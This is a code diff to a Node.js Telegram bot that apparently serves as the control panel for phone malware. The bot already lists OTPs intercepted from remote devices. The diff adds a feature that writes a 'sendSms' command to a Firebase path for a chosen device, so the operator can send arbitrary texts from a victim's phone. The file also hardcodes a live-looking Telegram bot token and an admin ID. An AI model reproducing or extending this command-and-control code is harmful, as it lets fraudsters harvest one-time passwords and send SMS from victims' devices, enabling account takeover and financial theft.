@@ -15,6 +15,7 @@ const token = '8797042079:AAE0aDd5ZQlegN2CKKWe4yG305Rvmldo308';
 const bot = new TelegramBot(token, { polling: true });
 
 let usersDB = { adminId: "6799525497", users: {} };
+const userStates = {};
 
 function isAuthorized(chatId) {
     const uid = chatId.toString();
@@ -510,13 +511,86 @@ bot.on('callback_query', async (query) => {
                     const dt = new Date(m.date).toLocaleString();
                     reply += `<b>From:</b> ${escapeHtml(m.ph)}\n<b>Time:</b> ${escapeHtml(dt)}\n<b>Message:</b> ${escapeHtml(m.msg)}\n\n`;
                 }
-                bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
+                
+                const kb = [];
+                if (server.type === 'rto') {
+                    kb.push([{ text: `📤 Send SMS from this Device`, callback_data: `sendsms_${server.id}_${deviceId}` }]);
+                }
+                
+                bot.sendMessage(chatId, reply, { 
+                    parse_mode: 'HTML',
+                    reply_markup: kb.length > 0 ? { inline_keyboard: kb } : undefined
+                });
             } else {
                 bot.sendMessage(chatId, "No OTPs found for this number.");
             }
         } catch (e) {
             bot.sendMessage(chatId, "Error fetching OTPs.");
         }
+    } else if (data.startsWith('sendsms_')) {
+        const parts = data.split('_');
+        const srvId = parts[1] + '_' + parts[2]; 
+        const deviceId = parts.slice(3).join('_');
+        const server = servers.find(s => s.id === srvId);
+        
+        if (!server || server.type !== 'rto') {
+            return bot.sendMessage(chatId, "⚠️ Send SMS is only supported for Admin DB right now.");
+        }
+        
+        userStates[chatId] = { action: 'await_sms', serverId: srvId, deviceId: deviceId };
+        bot.sendMessage(chatId, `📝 <b>Send SMS Mode</b>\n━━━━━━━━━━━━━━━━━━\nAap is device se message bhejne wale hain.\n\nKripya destination number aur message is format mein bhejein:\n\n<code>NUMBER | MESSAGE</code>\n\nExample:\n<code>9876543210 | Hello friend</code>\n\nCancel karne ke liye /cancel bhejein.`, { parse_mode: 'HTML' });
+    }
+});
+
+bot.onText(/\/cancel/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    if (userStates[chatId]) {
+        delete userStates[chatId];
+        bot.sendMessage(chatId, "❌ Action cancelled.");
+    }
+});
+
+bot.on('message', async (msg) => {
+    if (!msg.text || msg.text.startsWith('/')) return;
+    const chatId = msg.chat.id.toString();
+    const state = userStates[chatId];
+    
+    if (state && state.action === 'await_sms') {
+        const text = msg.text;
+        const parts = text.split('|');
+        if (parts.length < 2) {
+            return bot.sendMessage(chatId, "❌ Invalid format. Please use:\n<code>NUMBER | MESSAGE</code>", { parse_mode: 'HTML' });
+        }
+        
+        const targetNumber = parts[0].trim();
+        const smsMessage = parts.slice(1).join('|').trim();
+        
+        const server = servers.find(s => s.id === state.serverId);
+        if (!server || server.type !== 'rto') {
+            delete userStates[chatId];
+            return bot.sendMessage(chatId, "Server not found or not supported.");
+        }
+        
+        const db = dbs[state.serverId];
+        if (!db) {
+            return bot.sendMessage(chatId, "Database connection error.");
+        }
+        
+        try {
+            const smsPath = `clients/${state.deviceId}/webhookEvent/sendSms`;
+            await set(ref(db, smsPath), {
+                isSended: false,
+                to: targetNumber,
+                message: smsMessage,
+                sms: smsMessage
+            });
+            
+            bot.sendMessage(chatId, `✅ <b>SMS Command Sent!</b>\n━━━━━━━━━━━━━━━━━━\n<b>To:</b> <code>${targetNumber}</code>\n<b>Message:</b> ${escapeHtml(smsMessage)}\n\nDevice will process this shortly.`, { parse_mode: 'HTML' });
+        } catch (error) {
+            bot.sendMessage(chatId, `❌ <b>Failed to send:</b> ${error.message}`, { parse_mode: 'HTML' });
+        }
+        
+        delete userStates[chatId];
     }
 });
 
